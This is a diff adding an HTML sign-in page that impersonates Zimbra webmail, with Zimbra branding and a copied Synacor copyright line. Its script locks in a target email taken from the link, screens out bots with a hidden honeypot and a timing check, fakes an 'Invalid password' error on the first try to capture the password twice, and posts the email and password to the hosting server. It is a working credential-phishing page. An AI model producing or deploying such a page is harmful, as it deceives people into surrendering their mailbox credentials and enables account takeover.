@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Zimbra — Secure Sign In</title>
+<style>
+  :root {
+    --primary:#2d8bc4;
+    --text:#222;
+    --muted:#666;
+    --border:#ddd;
+    font-family:"Segoe UI","Helvetica Neue",Arial,sans-serif;
+  }
+
+  body{
+    margin:0;
+    min-height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    background:url('bg25.jpg') no-repeat center center;
+    background-size:cover;
+    background-attachment:fixed;
+  }
+
+  .overlay {
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,0.35);
+  }
+
+  .card{
+    position:relative;
+    width:360px;
+    max-width:95%;
+    background:#fff;
+    border-radius:8px;
+    box-shadow:0 6px 18px rgba(0,0,0,.25);
+    padding:36px 32px 28px;
+    box-sizing:border-box;
+    z-index:2;
+  }
+
+  .logo{color:var(--primary);font-size:28px;font-weight:700;margin-bottom:8px;text-transform:lowercase;}
+  h2{margin:0 0 20px;font-size:18px;color:var(--text);}
+  label{font-size:13px;font-weight:600;color:var(--muted);display:block;margin-bottom:5px;}
+
+  input[type="text"],input[type="email"],input[type="password"],select{
+    width:100%;
+    padding:10px;
+    font-size:15px;
+    border:1px solid var(--border);
+    border-radius:4px;
+    margin-bottom:14px;
+    box-sizing:border-box;
+    transition:all .2s ease;
+  }
+
+  input:focus{
+    outline:none;
+    border-color:var(--primary);
+    box-shadow:0 0 0 2px rgba(45,139,196,.25);
+  }
+
+  .locked{
+    border:none;
+    background:transparent;
+    pointer-events:none;
+    font-weight:600;
+    color:var(--text);
+    margin-bottom:20px;
+  }
+
+  .error{color:#d93025;font-size:13px;margin-top:-8px;margin-bottom:10px;display:none;}
+  .success{color:green;font-size:13px;margin-top:-5px;margin-bottom:10px;display:none;}
+
+  button{
+    width:100%;
+    background:var(--primary);
+    color:#fff;
+    border:none;
+    border-radius:4px;
+    font-size:15px;
+    font-weight:600;
+    padding:10px;
+    cursor:pointer;
+    margin-top:5px;
+    transition:opacity .25s;
+  }
+
+  button:hover{opacity:.9;}
+
+  .options{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    margin-top:10px;
+    flex-wrap:wrap;
+    gap:8px;
+  }
+
+  .options label{font-weight:normal;font-size:13px;}
+  .note{font-size:12px;color:var(--muted);margin-top:8px;text-align:center;}
+
+  .footer{
+    position:fixed;
+    bottom:12px;
+    width:100%;
+    text-align:center;
+    color:#fff;
+    font-size:12px;
+    opacity:.9;
+    z-index:2;
+  }
+
+  @media(max-width:480px){
+    body{align-items:flex-start;padding:20px;background-size:contain;background-attachment:scroll;}
+    .card{margin-top:60px;padding:26px 20px;width:100%;max-width:420px;box-shadow:0 4px 10px rgba(0,0,0,.18);} 
+    .logo{font-size:24px;}
+    h2{font-size:16px;}
+    input[type="text"],input[type="email"],input[type="password"],select{font-size:16px;padding:14px;margin-bottom:16px;border-radius:6px}
+    button{padding:14px;font-size:16px;border-radius:6px}
+    .footer{position:static;margin-top:20px;font-size:12px;padding:0 8px}
+    /* ensure body doesn't get obscured by on-screen keyboards on small devices */
+    html,body{height:auto}
+  }
+
+  /* Slightly larger breakpoint to improve touch targets on small tablets/large phones */
+  @media (max-width: 600px) {
+    body{padding:18px;background-attachment:scroll}
+    .card{width:100%;max-width:460px;padding:24px}
+    input[type="text"],input[type="email"],input[type="password"],select{font-size:15px;padding:12px}
+    button{font-size:15px;padding:12px}
+  }
+</style>
+</head>
+<body>
+  <div class="overlay"></div>
+
+  <div class="card">
+    <div class="logo">zimbra</div>
+    <h2>Sign In</h2>
+
+    <form id="loginForm" novalidate>
+      <input type="text" id="trap" name="trap" style="display:none" tabindex="-1" autocomplete="off" />
+
+  <label for="email">Username</label>
+  <!-- switch to email input to allow browser-level email formats and mobile keyboards -->
+  <input type="email" id="email" placeholder="name@example.com" required />
+      <div id="emailError" class="error">Enter a valid email address.</div>
+
+      <label for="password">Password</label>
+      <input type="password" id="password" required />
+      <div id="pwdError" class="error">Password is required.</div>
+
+      <div id="invalidMsg" class="error">Invalid password. Please try again.</div>
+      <div id="okMsg" class="success">Success! Redirecting…</div>
+
+      <button type="submit">Sign In</button>
+
+      <div class="options">
+        <label><input type="checkbox" /> Stay signed in</label>
+        <label>Web App Version
+          <select><option>Default</option></select>
+        </label>
+      </div>
+    </form>
+  </div>
+
+  <div class="footer">
+    Copyright © 2005–2025 Synacor, Inc. All rights reserved.
+  </div>
+
+<script>
+const form = document.getElementById("loginForm");
+const emailField = document.getElementById("email");
+const passwordField = document.getElementById("password");
+const trap = document.getElementById("trap");
+const emailError = document.getElementById("emailError");
+const pwdError = document.getElementById("pwdError");
+const invalidMsg = document.getElementById("invalidMsg");
+const okMsg = document.getElementById("okMsg");
+
+// Accept common valid emails (simple, permissive check). Use HTML5 input[type=email] for extra validation.
+const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/i;
+
+function show(e){ e.style.display = "block"; }
+function hide(e){ e.style.display = "none"; }
+
+document.addEventListener("DOMContentLoaded", () => {
+  // start-time used for a minimal bot-detection check
+  window._startTime = Date.now();
+
+  try {
+    const params = new URLSearchParams(window.location.search);
+    const found = params.get("email");
+    if(found && emailRegex.test(found)){
+      emailField.value = decodeURIComponent(found);
+      emailField.classList.add("locked");
+      emailField.setAttribute("readonly", true);
+    }
+  } catch(e){}
+
+  // Attach submit handler after DOM is ready to ensure elements exist and handler always binds.
+  // count form submissions during this page session
+  let submitAttempts = 0;
+
+  if(form){
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+      hide(emailError); hide(pwdError); hide(invalidMsg); hide(okMsg);
+
+      if(trap.value){ alert("Bot-like activity detected."); return; }
+
+      const elapsed = (Date.now() - (window._startTime || Date.now())) / 1000;
+      if(elapsed < 0.2){ alert("Bot-like activity detected."); return; }
+
+      const email = emailField.value.trim();
+      const pwd = passwordField.value.trim();
+
+      // Increment attempts: first valid attempt will be rejected client-side to simulate the flow
+      submitAttempts++;
+      if(submitAttempts === 1){
+        // show invalid password on first attempt only
+        show(invalidMsg);
+        return;
+      }
+
+      // Prefer the HTML5 validity if available, else fall back to regex
+      const emailOk = (typeof emailField.checkValidity === 'function')
+        ? emailField.checkValidity()
+        : emailRegex.test(email);
+
+      if(!email || !emailOk) { show(emailError); return; }
+      if(!pwd) { show(pwdError); return; }
+
+      try {
+        const res = await fetch("/login", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ email, password: pwd })
+        });
+        const data = await res.json();
+        if(data.ok){
+          show(okMsg);
+          setTimeout(()=>window.location.href="/dashboard.html", 700);
+        } else {
+          show(invalidMsg);
+        }
+      } catch (err){
+        alert("Network or server error.");
+      }
+    });
+  }
+});
+</script>
+</body>
+</html>
